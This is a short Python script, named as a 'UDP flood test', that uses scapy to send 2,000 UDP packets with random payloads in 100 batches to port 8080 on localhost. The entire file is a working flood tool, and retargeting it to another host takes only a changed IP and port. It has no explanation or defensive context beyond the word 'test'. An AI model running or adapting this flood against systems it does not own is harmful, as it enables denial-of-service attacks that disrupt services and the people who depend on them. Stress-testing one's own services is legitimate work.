# udp_flood_test.py
from scapy.all import IP, UDP, RandShort, send
import random

# Define the target URL
URL = "http://127.0.0.1:8080/"
TARGET_IP = "127.0.0.1"  # Extracted from URL
TARGET_PORT = 8080         # Extracted from URL

for i in range(100):  # 100 iterations
    # Create 20 UDP packets per batch with random payload
    packets = [
        IP(dst=TARGET_IP) / UDP(dport=TARGET_PORT, sport=RandShort()) / ("X" * random.randint(10, 100))
        for _ in range(20)
    ]
    send(packets, verbose=0, inter=0.01)  # 10ms delay between bursts
    print(f"UDP Flood batch {i+1}/100 sent (total packets: {(i+1)*20})")

print("UDP Flood test complete.")